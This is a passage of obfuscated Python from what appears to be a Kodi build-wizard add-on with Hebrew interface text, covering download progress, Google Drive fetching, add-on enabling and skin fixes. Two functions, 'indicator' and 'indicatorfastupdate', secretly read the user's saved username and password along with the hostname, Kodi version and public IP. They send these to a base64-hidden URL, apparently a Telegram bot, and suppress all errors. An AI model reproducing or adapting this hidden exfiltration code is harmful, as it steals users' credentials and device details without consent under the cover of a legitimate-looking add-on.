            os .remove (O0O00OOOOO0OO0O0O )#line:3477
           except :#line:3478
            pass #line:3479
           break #line:3480
        O0O00OOO0OO0O0O00 =float (O0OOO000O0OOOO00O )/OO0O0OO0OOO000000 #line:3481
        O0O00OOO0OO0O0O00 =round (O0O00OOO0OO0O0O00 *100 ,2 )#line:3482
        OO0000OO00OO0O0O0 =O0OOO000O0OOOO00O /(1024 *1024 )#line:3483
        OO00O0000O00000OO =OO0O0OO0OOO000000 /(1024 *1024 )#line:3484
        OO00O0OO0OOOOOO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0000OO00OO0O0O0 ,'teal',OO00O0000O00000OO )#line:3485
        if (time .time ()-O000O0OOOO000000O )>0 :#line:3486
          O0OO0OOOOO0O00OOO =O0OOO000O0OOOO00O /(time .time ()-O000O0OOOO000000O )#line:3487
          O0OO0OOOOO0O00OOO =O0OO0OOOOO0O00OOO /1024 #line:3488
        else :#line:3489
         O0OO0OOOOO0O00OOO =0 #line:3490
        OO0O00000O0000OOO ='KB'#line:3491
        if O0OO0OOOOO0O00OOO >=1024 :#line:3492
           O0OO0OOOOO0O00OOO =O0OO0OOOOO0O00OOO /1024 #line:3493
           OO0O00000O0000OOO ='MB'#line:3494
        if O0OO0OOOOO0O00OOO >0 and not O0O00OOO0OO0O0O00 ==100 :#line:3495
            O000O00OO00OO0OOO =(OO0O0OO0OOO000000 -O0OOO000O0OOOO00O )/O0OO0OOOOO0O00OOO #line:3496
        else :#line:3497
            O000O00OO00OO0OOO =0 #line:3498
        O00O000OOOOOOO0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0OOOOO0O00OOO ,OO0O00000O0000OOO )#line:3499
        O00O0000O000OO00O .update (int (O0O00OOO0OO0O0O00 ),"Downloading "+name ,OO00O0OO0OOOOOO00 ,O00O000OOOOOOO0O0 )#line:3501
  O0O0O000O00000O00 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3504
  O00OOOO0O0OO0O0OO .close ()#line:3506
  extract (O0O00OOOOO0OO0O0O ,O0O0O000O00000O00 ,O00O0000O000OO00O )#line:3508
  if os .path .exists (O0O0O000O00000O00 +'/scakemyer-script.quasar.burst'):#line:3509
    if os .path .exists (O0O0O000O00000O00 +'/script.quasar.burst'):#line:3510
     shutil .rmtree (O0O0O000O00000O00 +'/script.quasar.burst',ignore_errors =False )#line:3511
    os .rename (O0O0O000O00000O00 +'/scakemyer-script.quasar.burst',O0O0O000O00000O00 +'/script.quasar.burst')#line:3512
  if os .path .exists (O0O0O000O00000O00 +'/plugin.video.kmediatorrent-master'):#line:3514
    if os .path .exists (O0O0O000O00000O00 +'/plugin.video.kmediatorrent'):#line:3515
     shutil .rmtree (O0O0O000O00000O00 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3516
    os .rename (O0O0O000O00000O00 +'/plugin.video.kmediatorrent-master',O0O0O000O00000O00 +'/plugin.video.kmediatorrent')#line:3517
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3518
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3519
  try :#line:3520
    os .remove (O0O00OOOOO0OO0O0O )#line:3521
  except :#line:3522
    pass #line:3523
  O00O0000O000OO00O .close ()#line:3524
def dis_or_enable_addon (OO0O00OO0O0OOOO00 ,O0O0OOOOO00OOO00O ,enable ="true"):#line:3525
    import json #line:3526
    O00OOOO00OOO0O00O ='"%s"'%OO0O00OO0O0OOOO00 #line:3527
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O00OO0O0OOOO00 )and enable =="true":#line:3528
        logging .warning ('already Enabled')#line:3529
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O00OO0O0OOOO00 )#line:3530
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O00OO0O0OOOO00 )and enable =="false":#line:3531
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O00OO0O0OOOO00 )#line:3532
    else :#line:3533
        OOOO0OOO000O0OOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OOOO00OOO0O00O ,enable )#line:3534
        O0O0OO0O0OO000O0O =xbmc .executeJSONRPC (OOOO0OOO000O0OOOO )#line:3535
        OOOO0000O0000OO00 =json .loads (O0O0OO0O0OO000O0O )#line:3536
        if enable =="true":#line:3537
            xbmc .log ("### Enabled %s, response = %s"%(OO0O00OO0O0OOOO00 ,OOOO0000O0000OO00 ))#line:3538
        else :#line:3539
            xbmc .log ("### Disabled %s, response = %s"%(OO0O00OO0O0OOOO00 ,OOOO0000O0000OO00 ))#line:3540
    if O0O0OOOOO00OOO00O =='auto':#line:3541
     return True #line:3542
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3543
def chunk_report (O00OOO0O000OOO000 ,OOO0O000O0OOOO00O ,OOOO0OOOO000O00O0 ):#line:3544
   OO00OOOOOO00O0OO0 =float (O00OOO0O000OOO000 )/OOOO0OOOO000O00O0 #line:3545
   OO00OOOOOO00O0OO0 =round (OO00OOOOOO00O0OO0 *100 ,2 )#line:3546
   if O00OOO0O000OOO000 >=OOOO0OOOO000O00O0 :#line:3548
      sys .stdout .write ('\n')#line:3549
def chunk_read (O0OO00O00OO00O0OO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3551
   import time #line:3552
   O0O0000000OO00O0O =int (filesize )*1000000 #line:3553
   OOOO000O0OO0O0O00 =0 #line:3555
   OO0OOO0OOO0OOOO0O =time .time ()#line:3556
   O0OOOOOO00OO0O0O0 =0 #line:3557
   logging .warning ('Downloading')#line:3559
   with open (destination ,"wb")as OOO000O0OOOO0O0O0 :#line:3560
    while 1 :#line:3561
      O000O0OO000O00O0O =time .time ()-OO0OOO0OOO0OOOO0O #line:3562
      O0OO0OOO0OOO00O00 =int (O0OOOOOO00OO0O0O0 *chunk_size )#line:3563
      OOO0O00000O0O0OO0 =O0OO00O00OO00O0OO .read (chunk_size )#line:3564
      OOO000O0OOOO0O0O0 .write (OOO0O00000O0O0OO0 )#line:3565
      OOO000O0OOOO0O0O0 .flush ()#line:3566
      OOOO000O0OO0O0O00 +=len (OOO0O00000O0O0OO0 )#line:3567
      O00OOOOOO0O0OO000 =float (OOOO000O0OO0O0O00 )/O0O0000000OO00O0O #line:3568
      O00OOOOOO0O0OO000 =round (O00OOOOOO0O0OO000 *100 ,2 )#line:3569
      if int (O000O0OO000O00O0O )>0 :#line:3570
        O00OO00OOOO0OOOO0 =int (O0OO0OOO0OOO00O00 /(1024 *O000O0OO000O00O0O ))#line:3571
      else :#line:3572
         O00OO00OOOO0OOOO0 =0 #line:3573
      if O00OO00OOOO0OOOO0 >1024 and not O00OOOOOO0O0OO000 ==100 :#line:3574
          OOOO0OO00OOO0O000 =int (((O0O0000000OO00O0O -O0OO0OOO0OOO00O00 )/1024 )/(O00OO00OOOO0OOOO0 ))#line:3575
      else :#line:3576
          OOOO0OO00OOO0O000 =0 #line:3577
      if OOOO0OO00OOO0O000 <0 :#line:3578
        OOOO0OO00OOO0O000 =0 #line:3579
      dp .update (int (O00OOOOOO0O0OO000 ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00OOOOOO0O0OO000 ,O0OO0OOO0OOO00O00 /(1024 *1024 ),O0O0000000OO00O0O /(1000 *1000 ),O00OO00OOOO0OOOO0 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (OOOO0OO00OOO0O000 ,60 ))#line:3580
      if dp .iscanceled ():#line:3581
         dp .close ()#line:3582
         break #line:3583
      if not OOO0O00000O0O0OO0 :#line:3584
         break #line:3585
      if report_hook :#line:3587
         report_hook (OOOO000O0OO0O0O00 ,chunk_size ,O0O0000000OO00O0O )#line:3588
      O0OOOOOO00OO0O0O0 +=1 #line:3589
   logging .warning ('END Downloading')#line:3590
   return OOOO000O0OO0O0O00 #line:3591
def googledrive_download (OOOO00OOO00OO00OO ,OO00OOOO0000O00OO ,O0000OOOO00O000O0 ,O000O0OO000OO00OO ):#line:3593
    O00O00OO00000O000 =[]#line:3597
    O0O0O00OO00OO000O =OOOO00OOO00OO00OO .split ('=')#line:3598
    OOOO00OOO00OO00OO =O0O0O00OO00OO000O [len (O0O0O00OO00OO000O )-1 ]#line:3599
    def OOOOOOOO0OO0O0O0O (O0OO0O0OOO0O000O0 ):#line:3601
        for O0O000O0O0OOOO00O in O0OO0O0OOO0O000O0 :#line:3603
            logging .warning ('cookie.name')#line:3604
            logging .warning (O0O000O0O0OOOO00O .name )#line:3605
            O00O00OO00OO0O0O0 =O0O000O0O0OOOO00O .value #line:3606
            if 'download_warning'in O0O000O0O0OOOO00O .name :#line:3607
                logging .warning (O0O000O0O0OOOO00O .value )#line:3608
                logging .warning ('cookie.value')#line:3609
                return O0O000O0O0OOOO00O .value #line:3610
            return O00O00OO00OO0O0O0 #line:3611
        return None #line:3613
    def OOO0OO00O0OO00OO0 (O0O00OOOOO00OO0OO ,O0O0OO0O0OO0000OO ):#line:3615
        OOO0OOOO000OOO0O0 =32768 #line:3617
        OO0O0000OO000O0O0 =time .time ()#line:3618
        with open (O0O0OO0O0OO0000OO ,"wb")as OOOOO0O0000OO0OOO :#line:3620
            O0OOO000O0OOO0OOO =1 #line:3621
            O0O00OO0000000OOO =32768 #line:3622
            try :#line:3623
                OOOO0O0O0OOO00OOO =int (O0O00OOOOO00OO0OO .headers .get ('content-length'))#line:3624
                print ('file total size :',OOOO0O0O0OOO00OOO )#line:3625
            except TypeError :#line:3626
                print ('using dummy length !!!')#line:3627
                OOOO0O0O0OOO00OOO =int (O000O0OO000OO00OO )*1000000 #line:3628
            for O000OO000O0OOOO00 in O0O00OOOOO00OO0OO .iter_content (OOO0OOOO000OOO0O0 ):#line:3629
                if O000OO000O0OOOO00 :#line:3630
                    OOOOO0O0000OO0OOO .write (O000OO000O0OOOO00 )#line:3631
                    OOOOO0O0000OO0OOO .flush ()#line:3632
                    O00O0OO0OO00OO0O0 =time .time ()-OO0O0000OO000O0O0 #line:3633
                    O0O000OO00OOO0O0O =int (O0OOO000O0OOO0OOO *O0O00OO0000000OOO )#line:3634
                    if O00O0OO0OO00OO0O0 ==0 :#line:3635
                        O00O0OO0OO00OO0O0 =0.1 #line:3636
                    O0000OO00000O0O00 =int (O0O000OO00OOO0O0O /(1024 *O00O0OO0OO00OO0O0 ))#line:3637
                    O00OOO0OO000OO0OO =int (O0OOO000O0OOO0OOO *O0O00OO0000000OOO *100 /OOOO0O0O0OOO00OOO )#line:3638
                    if O0000OO00000O0O00 >1024 and not O00OOO0OO000OO0OO ==100 :#line:3639
                      OOO0OOO0000O0OO0O =int (((OOOO0O0O0OOO00OOO -O0O000OO00OOO0O0O )/1024 )/(O0000OO00000O0O00 ))#line:3640
                    else :#line:3641
                      OOO0OOO0000O0OO0O =0 #line:3642
                    O0000OOOO00O000O0 .update (int (O00OOO0OO000OO0OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00OOO0OO000OO0OO ,O0O000OO00OOO0O0O /(1024 *1024 ),OOOO0O0O0OOO00OOO /(1000 *1000 ),O0000OO00000O0O00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOO0OOO0000O0OO0O ,60 ))#line:3644
                    O0OOO000O0OOO0OOO +=1 #line:3645
                    if O0000OOOO00O000O0 .iscanceled ():#line:3646
                     O0000OOOO00O000O0 .close ()#line:3647
                     break #line:3648
    O00OOOOOOO00OOOO0 ="https://docs.google.com/uc?export=download"#line:3649
    import urllib2 #line:3654
    import cookielib #line:3655
    from cookielib import CookieJar #line:3657
    O0O00000O0O000OO0 =CookieJar ()#line:3659
    OOOO00O0OO00O0O0O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O00000O0O000OO0 ))#line:3660
    O00O000OOOO0O00OO ={'id':OOOO00OOO00OO00OO }#line:3662
    OO0OOO0O000OOO000 =urllib .urlencode (O00O000OOOO0O00OO )#line:3663
    logging .warning (O00OOOOOOO00OOOO0 +'&'+OO0OOO0O000OOO000 )#line:3664
    O0000O0O0O00O0OOO =OOOO00O0OO00O0O0O .open (O00OOOOOOO00OOOO0 +'&'+OO0OOO0O000OOO000 )#line:3665
    OOO0O000O0O000OOO =O0000O0O0O00O0OOO .read ()#line:3666
    for O0OOOOOO00O0O00OO in O0O00000O0O000OO0 :#line:3668
         logging .warning (O0OOOOOO00O0O00OO )#line:3669
    OOOOO0O0OO00O00O0 =OOOOOOOO0OO0O0O0O (O0O00000O0O000OO0 )#line:3670
    logging .warning (OOOOO0O0OO00O00O0 )#line:3671
    if OOOOO0O0OO00O00O0 :#line:3672
        OOO0OOOO0OOOO0O0O ={'id':OOOO00OOO00OO00OO ,'confirm':OOOOO0O0OO00O00O0 }#line:3673
        O0OOOO000000OO0O0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3674
        OO0OOO0O000OOO000 =urllib .urlencode (OOO0OOOO0OOOO0O0O )#line:3675
        O0000O0O0O00O0OOO =OOOO00O0OO00O0O0O .open (O00OOOOOOO00OOOO0 +'&'+OO0OOO0O000OOO000 )#line:3676
        chunk_read (O0000O0O0O00O0OOO ,report_hook =chunk_report ,dp =O0000OOOO00O000O0 ,destination =OO00OOOO0000O00OO ,filesize =O000O0OO000OO00OO )#line:3677
    return (O00O00OO00000O000 )#line:3681
def kodi17Fix ():#line:3682
	O0O00OO0O00O0OO00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3683
	O0O00OOO0O0O00O0O =[]#line:3684
	for OO0OO00000OO0O0OO in sorted (O0O00OO0O00O0OO00 ,key =lambda OO00O00OO0OO0000O :OO00O00OO0OO0000O ):#line:3685
		O00O000OOO000O000 =os .path .join (OO0OO00000OO0O0OO ,'addon.xml')#line:3686
		if os .path .exists (O00O000OOO000O000 ):#line:3687
			OO00OO0O00OO00OO0 =OO0OO00000OO0O0OO .replace (ADDONS ,'')[1 :-1 ]#line:3688
			O0O0O0OOOO00O0OO0 =open (O00O000OOO000O000 )#line:3689
			OOOO00OOO0O0OO0OO =O0O0O0OOOO00O0OO0 .read ()#line:3690
			OOO00OO0O0OO00OO0 =parseDOM (OOOO00OOO0O0OO0OO ,'addon',ret ='id')#line:3691
			O0O0O0OOOO00O0OO0 .close ()#line:3692
			try :#line:3693
				O0O00OOO00O00O0OO =xbmcaddon .Addon (id =OOO00OO0O0OO00OO0 [0 ])#line:3694
			except :#line:3695
				try :#line:3696
					log ("%s was disabled"%OOO00OO0O0OO00OO0 [0 ],xbmc .LOGDEBUG )#line:3697
					O0O00OOO0O0O00O0O .append (OOO00OO0O0OO00OO0 [0 ])#line:3698
				except :#line:3699
					try :#line:3700
						log ("%s was disabled"%OO00OO0O00OO00OO0 ,xbmc .LOGDEBUG )#line:3701
						O0O00OOO0O0O00O0O .append (OO00OO0O00OO00OO0 )#line:3702
					except :#line:3703
						if len (OOO00OO0O0OO00OO0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO00OO0O00OO00OO0 ,xbmc .LOGERROR )#line:3704
						else :log ("Unabled to enable: %s"%OO0OO00000OO0O0OO ,xbmc .LOGERROR )#line:3705
	if len (O0O00OOO0O0O00O0O )>0 :#line:3706
		OO0OOO0OO0O0O00O0 =0 #line:3707
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3708
		for OO0O00000O00OOO0O in O0O00OOO0O0O00O0O :#line:3709
			OO0OOO0OO0O0O00O0 +=1 #line:3710
			O0000OOO0O0O0O0O0 =int (percentage (OO0OOO0OO0O0O00O0 ,len (O0O00OOO0O0O00O0O )))#line:3711
			DP .update (O0000OOO0O0O0O0O0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00000O00OOO0O ))#line:3712
			addonDatabase (OO0O00000O00OOO0O ,1 )#line:3713
			if DP .iscanceled ():break #line:3714
		if DP .iscanceled ():#line:3715
			DP .close ()#line:3716
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3717
			sys .exit ()#line:3718
		DP .close ()#line:3719
	forceUpdate ()#line:3720
def indicator ():#line:3722
       try :#line:3723
          import json #line:3724
          wiz .log ('FRESH MESSAGE')#line:3725
          OOO0O0000O0OO00O0 =(ADDON .getSetting ("user"))#line:3726
          O00000O0OO0O00000 =(ADDON .getSetting ("pass"))#line:3727
          O00OO0O00000OO0OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3728
          OO0000OOOO00000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3729
          OO0O0O00O0O000O0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3730
          O00OO00OOOO00OOO0 =str (json .loads (OO0O0O00O0O000O0O )['ip'])#line:3731
          OO00OOO0O0O0OO0OO =OOO0O0000O0OO00O0 #line:3732
          O00OO00OOO000O0O0 =O00000O0OO0O00000 #line:3733
          import socket #line:3734
          OO0O0O00O0O000O0O =urllib2 .urlopen (OO0000OOOO00000OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO00OOO0O0O0OO0OO +' - '+O00OO00OOO000O0O0 +' - '+O00OO0O00000OO0OO +' - '+O00OO00OOOO00OOO0 ).readlines ()#line:3735
       except :pass #line:3737
def indicatorfastupdate ():#line:3739
       try :#line:3740
          import json #line:3741
          wiz .log ('FRESH MESSAGE')#line:3742
          O0O000000O0OO0O00 =(ADDON .getSetting ("user"))#line:3743
          O0OO0O0OOOOOO000O =(ADDON .getSetting ("pass"))#line:3744
          OO0000O0000O00OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3745
          OO0OOO00000O0OOO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3747
          OOO0OOO0OOO00O000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3748
          OO0OO00OOO0O0OO00 =str (json .loads (OOO0OOO0OOO00O000 )['ip'])#line:3749
          OOO0O0OO0O0O000OO =O0O000000O0OO0O00 #line:3750
          OO000O0OOOO00O00O =O0OO0O0OOOOOO000O #line:3751
          import socket #line:3753
          OOO0OOO0OOO00O000 =urllib2 .urlopen (OO0OOO00000O0OOO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOO0O0OO0O0O000OO +' - '+OO000O0OOOO00O00O +' - '+OO0000O0000O00OO0 +' - '+OO0OO00OOO0O0OO00 ).readlines ()#line:3754
       except :pass #line:3756
def skinfix18 ():#line:3758
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3759
		O0O00OOO000O0OOO0 =wiz .workingURL (SKINID18DDONXML )#line:3760
		if O0O00OOO000O0OOO0 ==True :#line:3761
			O00OO0000O0O0OO00 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3762
			if len (O00OO0000O0O0OO00 )>0 :#line:3763
				O000OO00OOOO000O0 ='%s-%s.zip'%(SKINID18 ,O00OO0000O0O0OO00 [0 ])#line:3764
				OO0OO00OO0OOO0OO0 =wiz .workingURL (SKIN18ZIPURL +O000OO00OOOO000O0 )#line:3765
				if OO0OO00OO0OOO0OO0 ==True :#line:3766
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3767
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3768
					OO00000O00O000OOO =os .path .join (PACKAGES ,O000OO00OOOO000O0 )#line:3769
					try :os .remove (OO00000O00O000OOO )#line:3770
					except :pass #line:3771
					downloader .download (SKIN18ZIPURL +O000OO00OOOO000O0 ,OO00000O00O000OOO ,DP )#line:3772
					extract .all (OO00000O00O000OOO ,HOME ,DP )#line:3773
					try :#line:3774
						O00000OOO00OOO0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3775
						OOOO00OO0O0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3776
						os .rename (O00000OOO00OOO0OO ,OOOO00OO0O0OOO0O0 )#line:3777
					except :#line:3778
						pass #line:3779
					try :#line:3780
						OOO0O0OO0OOO00000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOO00OO0OOOOO0OOO =OOO0O0OO0OOO00000 .read ();OOO0O0OO0OOO00000 .close ()#line:3781
						O0O00O0O00000OOO0 =wiz .parseDOM (OOO00OO0OOOOO0OOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3782
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00O0O00000OOO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3783
					except :#line:3784
						pass #line:3785
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3786
					DP .close ()#line:3787
					xbmc .sleep (500 )#line:3788
					wiz .forceUpdate (True )#line:3789
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3790
				else :#line:3791
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3792
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0OO00OO0OOO0OO0 ,xbmc .LOGERROR )#line:3793
			else :#line:3794
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3795
		else :#line:3796
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3797
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3798
def skinfix17 ():#line:3799
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3800
		O000O00OO0OOOO0O0 =wiz .workingURL (SKINID17DDONXML )#line:3801
		if O000O00OO0OOOO0O0 ==True :#line:3802
			O0OOOOO0000000OOO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3803
			if len (O0OOOOO0000000OOO )>0 :#line:3804
				O00O00000O0000O0O ='%s-%s.zip'%(SKINID17 ,O0OOOOO0000000OOO [0 ])#line:3805
				O0OO00O0OO00OOO0O =wiz .workingURL (SKIN17ZIPURL +O00O00000O0000O0O )#line:3806
				if O0OO00O0OO00OOO0O ==True :#line:3807
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3808
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3809
					O00OO00000OO0O0OO =os .path .join (PACKAGES ,O00O00000O0000O0O )#line:3810
					try :os .remove (O00OO00000OO0O0OO )#line:3811
					except :pass #line:3812
					downloader .download (SKIN17ZIPURL +O00O00000O0000O0O ,O00OO00000OO0O0OO ,DP )#line:3813
					extract .all (O00OO00000OO0O0OO ,HOME ,DP )#line:3814
					try :#line:3815
						O0OOOO00O0OOO000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3816
						O00O00OO0OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3817
						os .rename (O0OOOO00O0OOO000O ,O00O00OO0OO0000O0 )#line:3818
					except :#line:3819
						pass #line:3820
					try :#line:3821
						OO000OOO00O0O0000 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0OO000O0OOOOO0O =OO000OOO00O0O0000 .read ();OO000OOO00O0O0000 .close ()#line:3822
						OO00O0OO000000000 =wiz .parseDOM (OO0OO000O0OOOOO0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3823
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O0OO000000000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3824
					except :#line:3825
						pass #line:3826
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3827
					DP .close ()#line:3828
					xbmc .sleep (500 )#line:3829
					wiz .forceUpdate (True )#line:3830
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3831
				else :#line:3832
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3833
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OO00O0OO00OOO0O ,xbmc .LOGERROR )#line:3834
			else :#line:3835
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3836
		else :#line:3837
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3838
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3839
def fix17update ():#line:3840
	if KODIV >=17 and KODIV <18 :#line:3841
		wiz .kodi17Fix ()#line:3842
		xbmc .sleep (4000 )#line:3843
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3844
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3845
		fixfont ()#line:3846
		O00000O000OO0O0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3847
		try :#line:3849
			OO00OO000O00O0O00 =open (O00000O000OO0O0OO ,'r')#line:3850
			OOOO00O0O00O0O00O =OO00OO000O00O0O00 .read ()#line:3851
			OO00OO000O00O0O00 .close ()#line:3852
			O0O0000O0000O0O0O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3853
			O00OO00OOOOO000O0 =re .compile (O0O0000O0000O0O0O ).findall (OOOO00O0O00O0O00O )[0 ]#line:3854
			OO00OO000O00O0O00 =open (O00000O000OO0O0OO ,'w')#line:3855
			OO00OO000O00O0O00 .write (OOOO00O0O00O0O00O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00OO00OOOOO000O0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3856
			OO00OO000O00O0O00 .close ()#line:3857
		except :#line:3858
				pass #line:3859
		wiz .kodi17Fix ()#line:3860
		O00000O000OO0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3861
		try :#line:3862
			OO00OO000O00O0O00 =open (O00000O000OO0O0OO ,'r')#line:3863
			OOOO00O0O00O0O00O =OO00OO000O00O0O00 .read ()#line:3864
			OO00OO000O00O0O00 .close ()#line:3865
			O0O0000O0000O0O0O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3866
			O00OO00OOOOO000O0 =re .compile (O0O0000O0000O0O0O ).findall (OOOO00O0O00O0O00O )[0 ]#line:3867
			OO00OO000O00O0O00 =open (O00000O000OO0O0OO ,'w')#line:3868
			OO00OO000O00O0O00 .write (OOOO00O0O00O0O00O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00OO00OOOOO000O0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3869
			OO00OO000O00O0O00 .close ()#line:3870
		except :#line:3871
				pass #line:3872
		swapSkins ('skin.Premium.mod')#line:3873
def fix18update ():#line:3875
	if KODIV >=18 :#line:3876
		xbmc .sleep (4000 )#line:3877
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3878
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3879
		fixfont ()#line:3880
		OO0O00O000OOO0OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3881
		try :#line:3882
			OOO000O0O0000O0OO =open (OO0O00O000OOO0OO0 ,'r')#line:3883
			OOO0O000OO00O0O00 =OOO000O0O0000O0OO .read ()#line:3884
			OOO000O0O0000O0OO .close ()#line:3885
			O000OO00O0O00O000 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3886
